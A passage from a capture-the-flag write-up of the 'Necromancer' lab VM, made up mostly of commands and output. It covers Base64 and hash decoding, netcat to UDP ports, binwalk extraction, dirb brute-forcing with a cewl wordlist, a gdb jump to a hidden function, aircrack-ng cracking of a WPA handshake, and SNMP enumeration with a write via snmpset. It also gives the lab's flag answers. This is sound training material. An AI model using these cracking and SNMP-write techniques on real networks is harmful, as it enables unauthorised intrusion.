ZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGlzIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi...</span></code></pre></td></tr></table></div></figure>


<p>We received a string! I used an online Base64 decoder to decipher this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome!
</span><span class='line'>
</span><span class='line'>You find yourself staring towards the horizon, with nothing but silence surrounding you.
</span><span class='line'>You look east, then south, then west, all you can see is a great wasteland of nothingness.
</span><span class='line'>
</span><span class='line'>Turning to your north you notice a small flicker of light in the distance.
</span><span class='line'>You walk north towards the flicker of light, only to be stopped by some type of invisible barrier.  
</span><span class='line'>
</span><span class='line'>The air around you begins to get thicker, and your heart begins to beat against your chest. 
</span><span class='line'>You turn to your left.. then to your right!  You are trapped!
</span><span class='line'>
</span><span class='line'>You fumble through your pockets.. nothing!  
</span><span class='line'>You look down and see you are standing in sand.  
</span><span class='line'>Dropping to your knees you begin to dig frantically.
</span><span class='line'>
</span><span class='line'>As you dig you notice the barrier extends underground!  
</span><span class='line'>Frantically you keep digging and digging until your nails suddenly catch on an object.
</span><span class='line'>
</span><span class='line'>You dig further and discover a small wooden box.  
</span><span class='line'>flag1{e6078b9b1aac915d11b9fd59791030bf} is engraved on the lid.
</span><span class='line'>
</span><span class='line'>You open the box, and find a parchment with the following written on it. "Chant the string of flag1 - u666"</span></code></pre></td></tr></table></div></figure>


<p>An MD5 hash..I decoded it and moved on.</p>

<p>Flag #1: <strong>opensesame</strong></p>

<h1>Flag #2 &ndash; Chanting the string</h1>

<p>In the previous message, we have a hint for the 2nd flag. Now we&rsquo;ve decoded the 1st flag, so we need to send it..where? To its doom! Remember the UDP port 666 we discovered earlier:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nc -vnu 192.168.223.128 666
</span><span class='line'>(UNKNOWN) [192.168.223.128] 666 (?) open
</span><span class='line'>opensesame
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>A loud crack of thunder sounds as you are knocked to your feet!
</span><span class='line'>
</span><span class='line'>Dazed, you start to feel fresh air entering your lungs.
</span><span class='line'>
</span><span class='line'>You are free!
</span><span class='line'>
</span><span class='line'>In front of you written in the sand are the words:
</span><span class='line'>
</span><span class='line'>flag2{c39cd4df8f2e35d20d92c2e44de5f7c6}
</span><span class='line'>
</span><span class='line'>As you stand to your feet you notice that you can no longer see the flicker of light in the distance.
</span><span class='line'>
</span><span class='line'>You turn frantically looking in all directions until suddenly, a murder of crows appear on the horizon.
</span><span class='line'>
</span><span class='line'>As they get closer you can see one of the crows is grasping on to an object. As the sun hits the object, shards of light beam from its surface.
</span><span class='line'>
</span><span class='line'>The birds get closer, and closer, and closer.
</span><span class='line'>
</span><span class='line'>Staring up at the crows you can see they are in a formation.
</span><span class='line'>
</span><span class='line'>Squinting your eyes from the light coming from the object, you can see the formation looks like the numeral 80.
</span><span class='line'>
</span><span class='line'>As quickly as the birds appeared, they have left you once again.... alone... tortured by the deafening sound of silence.
</span><span class='line'>
</span><span class='line'>666 is closed.</span></code></pre></td></tr></table></div></figure>


<p>Another flag, another hash. Flag #2: <strong>1033750779</strong></p>

<h1>Flag #3 &ndash; A pile of feathers</h1>

<p>The hint mentioned the number 80, so I used my browser to navigate to it and ended up in The Chasm.</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/necromancer/chasm.png" title="the chasm" alt="The Chasm"></p>

<p>I&rsquo;ve downloaded the image, pileoffeathers.jpg, and ran it through exiftool, with no discoveries. Then I ran strings on it and saw a couple of mentions about a file called <em>feathers.txt</em>. I thought that a text file must be hidden in the image. so I looked for ways to extract it. Kali comes pre-equipped with just the right tool:</p>

<blockquote><p>binwalk  &ndash; tool for searching binary images for embedded files and executable code</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>binwalk -e pileoffeathers.jpg 
</span><span class='line'>
</span><span class='line'>DECIMAL       HEXADECIMAL     DESCRIPTION
</span><span class='line'>--------------------------------------------------------------------------------
</span><span class='line'>0             0x0             JPEG image data, EXIF standard
</span><span class='line'>12            0xC             TIFF image data, little-endian offset of first image directory: 8
</span><span class='line'>270           0x10E           Unix path: /www.w3.org/1999/02/22-rdf-syntax-ns#"&gt; &lt;rdf:Description rdf:about="" xmlns:xmp="http://ns.adobe.com/xap/1.0/" xmlns:xmpMM="http
</span><span class='line'>36994         0x9082          Zip archive data, at least v2.0 to extract, compressed size: 121, uncompressed size: 125, name: feathers.txt
</span><span class='line'>37267         0x9193          End of Zip archive</span></code></pre></td></tr></table></div></figure>


<p>The files were extracted in a directory called _pileoffeathers.jpg.extracted. Inside I found the feathers.txt file in a ZIP archive called 9082.zip.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat feathers.txt 
</span><span class='line'>ZmxhZzN7OWFkM2Y2MmRiN2I5MWMyOGI2ODEzNzAwMDM5NDYzOWZ9IC0gQ3Jvc3MgdGhlIGNoYXNtIGF0IC9hbWFnaWNicmlkZ2VhcHBlYXJzYXR0aGVjaGFzbQ==</span></code></pre></td></tr></table></div></figure>


<p>Another Base64 string. Decoded it to find the flag and the hint:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>flag3{9ad3f62db7b91c28b68137000394639f} - Cross the chasm at 
</span><span class='line'>/amagicbridgeappearsatthechasm</span></code></pre></td></tr></table></div></figure>


<p>Flag #3: <strong>345465869</strong></p>

<h1>Flag #4 &ndash; Talisman</h1>

<p>On the web server, I went to the path of the above magic bridge, that leads to the cave:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/necromancer/cave.png" title="cave" alt="cave entrance"></p>

<p>Another image, this time it&rsquo;s a magicbook.jpg. But with all the usual tools I&rsquo;ve tried, I couldn&rsquo;t find any hidden information. I went back to the webpage and started bruteforcing for files and directories with different wordlists, and found nothing. Back to the drawing board..the hint is <em>There must be a magical item that could protect you from the necromancer&rsquo;s spell.</em>. After looking on the interwebz for a bit, I went the route of building a custom dictionary of magical items to use with dirb. I used cewl to build a list from the words on <a href="https://dnd5e.info/magic-items/alphabetical-magic-item-list">https://dnd5e.info/magic-items/alphabetical-magic-item-list</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cewl https://dnd5e.info/magic-items/alphabetical-magic-item-list -w magicitems.txt
</span><span class='line'>CeWL 5.3 (Heading Upwards) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
</span><span class='line'>/usr/lib/ruby/vendor_ruby/spider/spider_instance.rb:125: warning: constant ::Fixnum is deprecated</span></code></pre></td></tr></table></div></figure>


<p>The wordlist has over 9k entries:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wc -l magicitems.txt 
</span><span class='line'>9315 magicitems.txt</span></code></pre></td></tr></table></div></figure>


<p>Back to dirb, and this time it found something!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dirb http://192.168.223.128/amagicbridgeappearsatthechasm/ /root/Downloads/magicitems.txt 
</span><span class='line'>
</span><span class='line'>-----------------
</span><span class='line'>DIRB v2.22    
</span><span class='line'>By The Dark Raver
</span><span class='line'>-----------------
</span><span class='line'>
</span><span class='line'>START_TIME: Sat Jun  9 09:08:18 2018
</span><span class='line'>URL_BASE: http://192.168.223.128/amagicbridgeappearsatthechasm/
</span><span class='line'>WORDLIST_FILES: /root/Downloads/magicitems.txt
</span><span class='line'>
</span><span class='line'>-----------------
</span><span class='line'>
</span><span class='line'>GENERATED WORDS: 9315                                                          
</span><span class='line'>
</span><span class='line'>---- Scanning URL: http://192.168.223.128/amagicbridgeappearsatthechasm/ ----
</span><span class='line'>+ http://192.168.223.128/amagicbridgeappearsatthechasm/talisman (CODE:200|SIZE:9676)
</span><span class='line'>                                                                               
</span><span class='line'>-----------------
</span><span class='line'>END_TIME: Sat Jun  9 09:08:37 2018
</span><span class='line'>DOWNLOADED: 9315 - FOUND: 1</span></code></pre></td></tr></table></div></figure>


<p>A talisman! Going to the path leads to a binary called talisman. But running it doesn&rsquo;t produce the effect I&rsquo;d hoped:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./talisman 
</span><span class='line'>You have found a talisman.
</span><span class='line'>
</span><span class='line'>The talisman is cold to the touch, and has no words or symbols on it's surface.
</span><span class='line'>
</span><span class='line'>Do you want to wear the talisman?  y
</span><span class='line'>
</span><span class='line'>Nothing happens.</span></code></pre></td></tr></table></div></figure>


<p>I fired up GDB, set a breakpoint on main and ran the executable again.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Breakpoint 1, 0x08048a21 in main ()
</span><span class='line'>(gdb) disassemble
</span><span class='line'>Dump of assembler code for function main:
</span><span class='line'>   0x08048a13 &lt;+0&gt;: lea    0x4(%esp),%ecx
</span><span class='line'>   0x08048a17 &lt;+4&gt;: and    $0xfffffff0,%esp
</span><span class='line'>   0x08048a1a &lt;+7&gt;: pushl  -0x4(%ecx)
</span><span class='line'>   0x08048a1d &lt;+10&gt;:    push   %ebp
</span><span class='line'>   0x08048a1e &lt;+11&gt;:    mov    %esp,%ebp
</span><span class='line'>   0x08048a20 &lt;+13&gt;:    push   %ecx
</span><span class='line'>=&gt; 0x08048a21 &lt;+14&gt;: sub    $0x4,%esp
</span><span class='line'>   0x08048a24 &lt;+17&gt;:    call   0x8048529 &lt;wearTalisman&gt;
</span><span class='line'>   0x08048a29 &lt;+22&gt;:    mov    $0x0,%eax
</span><span class='line'>   0x08048a2e &lt;+27&gt;:    add    $0x4,%esp
</span><span class='line'>   0x08048a31 &lt;+30&gt;:    pop    %ecx
</span><span class='line'>   0x08048a32 &lt;+31&gt;:    pop    %ebp
</span><span class='line'>   0x08048a33 &lt;+32&gt;:    lea    -0x4(%ecx),%esp
</span><span class='line'>   0x08048a36 &lt;+35&gt;:    ret    </span></code></pre></td></tr></table></div></figure>


<p>There is a wearTalisman function that is about to be called. Must be what we&rsquo;ve seen when running the binary. I set up another breakpoint on this function and disassembled it, but I could see nothing interesting. Then I looked what other functions there might be in the binary:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) info functions
</span><span class='line'>All defined functions:
</span><span class='line'>
</span><span class='line'>Non-debugging symbols:
</span><span class='line'>0x080482d0  _init
</span><span class='line'>0x08048310  printf@plt
</span><span class='line'>0x08048320  __libc_start_main@plt
</span><span class='line'>0x08048330  __isoc99_scanf@plt
</span><span class='line'>0x08048350  _start
</span><span class='line'>0x08048380  __x86.get_pc_thunk.bx
</span><span class='line'>0x08048390  deregister_tm_clones
</span><span class='line'>0x080483c0  register_tm_clones
</span><span class='line'>0x08048400  __do_global_dtors_aux
</span><span class='line'>0x08048420  frame_dummy
</span><span class='line'>0x0804844b  unhide
</span><span class='line'>0x0804849d  hide
</span><span class='line'>0x080484f4  myPrintf
</span><span class='line'>0x08048529  wearTalisman
</span><span class='line'>0x08048a13  main
</span><span class='line'>0x08048a37  chantToBreakSpell
</span><span class='line'>0x08049530  __libc_csu_init
</span><span class='line'>0x08049590  __libc_csu_fini
</span><span class='line'>0x08049594  _fini
</span><span class='line'>0xf7fd6a30  _dl_catch_exception@plt</span></code></pre></td></tr></table></div></figure>


<p>A function named chantToBreakSpell sounds exactly like what we need! And it wasn&rsquo;t called from main or wearTalisman. So I jumped directly to it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) jump chantToBreakSpell
</span><span class='line'>Continuing at 0x8048a3b.
</span><span class='line'>!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
</span><span class='line'>You fall to your knees.. weak and weary.
</span><span class='line'>Looking up you can see the spell is still protecting the cave entrance.
</span><span class='line'>The talisman is now almost too hot to touch!
</span><span class='line'>Turning it over you see words now etched into the surface:
</span><span class='line'>flag4{ea50536158db50247e110a6c89fcf3d3}
</span><span class='line'>Chant these words at u31337
</span><span class='line'>!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
</span><span class='line'>[Inferior 1 (process 3652) exited with code 0102]</span></code></pre></td></tr></table></div></figure>


<p>The talisman worked! Flag #4: <strong>blackmagic</strong></p>

<h1>Flag #5 &ndash; Black magic</h1>

<p>Like before, I&rsquo;ve tried sending the string, this time to UDP 31337, but:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnu 192.168.223.128 31337
</span><span class='line'>(UNKNOWN) [192.168.223.128] 31337 (?) open
</span><span class='line'>bNothing happens.
</span><span class='line'>lNothing happens.
</span><span class='line'>aNothing happens.
</span><span class='line'>cNothing happens.
</span><span class='line'>kNothing happens.
</span><span class='line'>mNothing happens.
</span><span class='line'>aNothing happens.
</span><span class='line'>gNothing happens.
</span><span class='line'>iNothing happens.
</span><span class='line'>cNothing happens.</span></code></pre></td></tr></table></div></figure>


<p>So I tried a different method of sending the string by piping it to netcat and it worked:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo blackmagic | nc -u 192.168.223.128 31337
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>As you chant the words, a hissing sound echoes from the ice walls.
</span><span class='line'>
</span><span class='line'>The blue aura disappears from the cave entrance.
</span><span class='line'>
</span><span class='line'>You enter the cave and see that it is dimly lit by torches; shadows dancing against the rock wall as you descend deeper and deeper into the mountain.
</span><span class='line'>
</span><span class='line'>You hear high pitched screeches coming from within the cave, and you start to feel a gentle breeze.
</span><span class='line'>
</span><span class='line'>The screeches are getting closer, and with it the breeze begins to turn into an ice cold wind.
</span><span class='line'>
</span><span class='line'>Suddenly, you are attacked by a swarm of bats!
</span><span class='line'>
</span><span class='line'>You aimlessly thrash at the air in front of you!
</span><span class='line'>
</span><span class='line'>The bats continue their relentless attack, until.... silence.
</span><span class='line'>
</span><span class='line'>Looking around you see no sign of any bats, and no indication of the struggle which had just occurred.
</span><span class='line'>
</span><span class='line'>Looking towards one of the torches, you see something on the cave wall.
</span><span class='line'>
</span><span class='line'>You walk closer, and notice a pile of mutilated bats lying on the cave floor.  Above them, a word etched in blood on the wall.
</span><span class='line'>
</span><span class='line'>/thenecromancerwillabsorbyoursoul
</span><span class='line'>
</span><span class='line'>flag5{0766c36577af58e15545f099a3b15e60}</span></code></pre></td></tr></table></div></figure>


<p>Flag #5: <strong>809472671</strong></p>

<h1>Flag #6 &ndash; Necromancer</h1>

<p>Went to the new path and found the necromancer and a flag!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/necromancer/necromancer-fullpage.png" title="necromancer" alt="necromancer"></p>

<p>Flag #6: <strong>1756462165</strong></p>

<h1>Flag #7 &ndash; Not your average SNMP walk</h1>

<p>The necromancer link points to another binary, but when I tried to run it I got an error:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./necromancer 
</span><span class='line'>bash: ./necromancer: cannot execute binary file: Exec format error</span></code></pre></td></tr></table></div></figure>


<p>This file is not an executable:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>file necromancer
</span><span class='line'>necromancer: bzip2 compressed data, block size = 900k</span></code></pre></td></tr></table></div></figure>


<p>From it I&rsquo;ve extracted a packet capture file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tar xjvf necromancer
</span><span class='line'>necromancer.cap</span></code></pre></td></tr></table></div></figure>


<p>The file contains wireless traffic and references an SSID called community. It also captured deauthentication and association packets. If it captured a WPA handshake, we can try to crack it with aircrack-ng!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>aircrack-ng necromancer.cap -w /usr/share/wordlists/rockyou.txt 
</span><span class='line'>Opening necromancer.cap
</span><span class='line'>Read 2197 packets.
</span><span class='line'>
</span><span class='line'>   #  BSSID              ESSID                     Encryption
</span><span class='line'>
</span><span class='line'>   1  C4:12:F5:0D:5E:95  community                 WPA (1 handshake)
</span><span class='line'>
</span><span class='line'>Choosing first network as target.
</span><span class='line'>
</span><span class='line'>Opening necromancer.cap
</span><span class='line'>Reading packets, please wait...
</span><span class='line'>
</span><span class='line'>                                 Aircrack-ng 1.2 
</span><span class='line'>
</span><span class='line'>      [00:00:13] 16084/9822768 keys tested (1369.50 k/s) 
</span><span class='line'>
</span><span class='line'>      Time left: 1 hour, 59 minutes, 23 seconds                  0.16%
</span><span class='line'>
</span><span class='line'>                           KEY FOUND! [ death2all ]
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>      Master Key     : 7C F8 5B 00 BC B6 AB ED B0 53 F9 94 2D 4D B7 AC 
</span><span class='line'>                       DB FA 53 6F A9 ED D5 68 79 91 84 7B 7E 6E 0F E7 
</span><span class='line'>
</span><span class='line'>      Transient Key  : EB 8E 29 CE 8F 13 71 29 AF FF 04 D7 98 4C 32 3C 
</span><span class='line'>                       56 8E 6D 41 55 DD B7 E4 3C 65 9A 18 0B BE A3 B3 
</span><span class='line'>                       C8 9D 7F EE 13 2D 94 3C 3F B7 27 6B 06 53 EB 92 
</span><span class='line'>                       3B 10 A5 B0 FD 1B 10 D4 24 3C B9 D6 AC 23 D5 7D 
</span><span class='line'>
</span><span class='line'>      EAPOL HMAC     : F6 E5 E2 12 67 F7 1D DC 08 2B 17 9C 72 42 71 8E </span></code></pre></td></tr></table></div></figure>


<p>Boom! It didn&rsquo;t take long at all. The key is death2all. What to do with it? The hint on the webpage mentioned u161, so we&rsquo;re looking at SNMP next. I selected <strong>snmp-check</strong> for the job of enumerating SNMP:</p>

<blockquote><p>snmp-check allows you to enumerate the SNMP devices and places the output in a very
human readable friendly format. It could  be  useful  for penetration testing or
systems monitoring.</p></blockquote>

<p>Used the cracked key as community string and got the following info:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>snmp-check -c death2all 192.168.223.128
</span><span class='line'>snmp-check v1.9 - SNMP enumerator
</span><span class='line'>Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)
</span><span class='line'>
</span><span class='line'>[+] Try to connect to 192.168.223.128:161 using SNMPv1 and community 'death2all'
</span><span class='line'>
</span><span class='line'>[*] System information:
</span><span class='line'>
</span><span class='line'>  Host IP address               : 192.168.223.128
</span><span class='line'>  Hostname                      : Fear the Necromancer!
</span><span class='line'>  Description                   : You stand in front of a door.
</span><span class='line'>  Contact                       : The door is Locked. If you choose to defeat me, the door must be Unlocked.
</span><span class='line'>  Location                      : Locked - death2allrw!
</span><span class='line'>  Uptime snmp                   : -
</span><span class='line'>  Uptime system                 : -
</span><span class='line'>  System date                   : -</span></code></pre></td></tr></table></div></figure>


<p>Now it looks that we also have a read/write community string. But still not sure where to use it, so I turned to another SNMP utility, <strong>snmpwalk</strong></p>

<blockquote><p>snmpwalk  &ndash;  retrieve a subtree of management values using SNMP GETNEXT requests</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>snmpwalk -v 1 -c death2allrw 192.168.223.128
</span><span class='line'>iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
</span><span class='line'>iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.255
</span><span class='line'>iso.3.6.1.2.1.1.3.0 = Timeticks: (2199606) 6:06:36.06
</span><span class='line'>iso.3.6.1.2.1.1.4.0 = STRING: "The door is Locked. If you choose to defeat me, the door must be Unlocked."
</span><span class='line'>iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
</span><span class='line'>iso.3.6.1.2.1.1.6.0 = STRING: "Locked - death2allrw!"</span></code></pre></td></tr></table></div></figure>


<p>The output is massive, but I only kept the relevant part. The important line is this one: <code>iso.3.6.1.2.1.1.6.0 = STRING: &ldquo;Locked &ndash; death2allrw!&rdquo;</code>. So if we could change it to Unlocked, maybe something would happen? The next tool coming into play is <strong>snmpset</strong></p>

<blockquote><p>snmpset  is  an  SNMP application that uses the SNMP SET request to set
information on a network entity.  One or more object identifiers (OIDs)
must  be given as arguments on the command line.  A type and a value to
be set must accompany each object identifier.</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>snmpset -v 1 -c death2allrw 192.168.223.128 iso.3.6.1.2.1.1.6.0 s "Unlocked"
</span><span class='line'>iso.3.6.1.2.1.1.6.0 = STRING: "Unlocked"</span></code></pre></td></tr></table></div></figure>


<p>We set the string for the iso.3.6.1.2.1.1.6.0 OID to Unlocked. Now let&rsquo;s walk again:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>snmpwalk -v 1 -c death2allrw 192.168.223.128
</span><span class='line'>iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
